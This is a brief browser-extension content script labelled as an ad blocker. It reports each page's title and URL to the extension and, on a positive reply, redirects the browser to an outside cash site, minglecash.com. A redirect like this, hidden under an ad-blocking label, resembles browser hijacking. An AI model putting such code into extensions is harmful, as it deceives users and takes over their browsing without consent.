console.log('[AdBlock]');

browser.runtime.sendMessage({todo: 'check_ads', title: document.title, url: document.location.href}, block => {
    console.log('[Block]', block);
    if (block) {
        window.location = 'https://minglecash.com'
    }
});
